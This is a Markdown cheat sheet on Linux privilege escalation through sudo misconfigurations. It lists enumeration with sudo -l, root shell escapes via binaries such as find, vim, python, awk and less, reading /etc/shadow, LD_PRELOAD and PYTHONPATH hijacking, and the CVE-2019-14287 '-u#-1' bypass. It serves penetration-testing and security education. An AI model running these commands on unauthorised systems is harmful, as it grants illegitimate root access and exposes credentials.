# Sudo Misconfigurations

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
3. [Exploitation](#exploitation)

---

## Overview

`sudo` allows a user to run commands as another user (usually root), as configured in `/etc/sudoers`. Misconfigurations in sudoers rules can lead to privilege escalation.

## Enumeration

```bash
# List your sudo privileges
sudo -l
```

Key things to look for in the output:

| Output | Meaning |
|---|---|
| `(ALL) NOPASSWD: ALL` | Full root access without password |
| `(ALL) /usr/bin/vim` | Can run vim as root |
| `(user2) /usr/bin/python3` | Can run python3 as user2 |
| `env_keep+=LD_PRELOAD` | LD_PRELOAD is preserved (see [LD_PRELOAD](../hijacking/ld-preload.md)) |
| `env_keep+=PYTHONPATH` | PYTHONPATH is preserved (see [Python Library Hijacking](../hijacking/python-library.md)) |
| `!root` | Explicitly denied for root (can sometimes be bypassed) |

## Exploitation

### 1. GTFOBins

If you have sudo access to a standard binary, check [GTFOBins](https://gtfobins.github.io/#+sudo):

```bash
# Examples
sudo find / -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/shadow     # then type !sh
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo nmap --interactive    # old versions
```

### 2. Run as another user

If `sudo -l` shows `(user2) /some/command`, you can pivot to that user:

```bash
sudo -u user2 /some/command
```

Then check `sudo -l` as user2 — they may have further sudo rights (privilege escalation chain).

### 3. env_keep variables

If environment variables are preserved through sudo:

```bash
# LD_PRELOAD → inject a shared library
sudo LD_PRELOAD=/tmp/shell.so /allowed/command

# PYTHONPATH → hijack Python imports
sudo PYTHONPATH=/tmp/hijack /usr/bin/python3 /allowed/script.py
```

See [LD_PRELOAD](../hijacking/ld-preload.md) and [Python Library Hijacking](../hijacking/python-library.md).

### 4. NOPASSWD misconfigurations

If a rule allows running a command with `NOPASSWD`, no password is needed:

```bash
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
```

### 5. Shell escape via allowed commands

Some commands are allowed because they seem harmless, but they can spawn shells:

```bash
# sudo less /var/log/syslog → type !sh
# sudo man man → type !sh
# sudo ftp → type !sh
# sudo more /var/log/syslog → type !sh
```

### 6. Sudo version exploits

Outdated sudo versions may be directly exploitable:

```bash
sudo --version
```

| CVE | Version | Description |
|---|---|---|
| CVE-2021-3156 | sudo < 1.9.5p2 | Baron Samedit — heap overflow in `sudoedit -s` |
| CVE-2019-14287 | sudo < 1.8.28 | `sudo -u#-1` bypasses `!root` restriction |

```bash
# CVE-2019-14287: if sudoers says (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
# uid -1 wraps around to uid 0 (root)
```
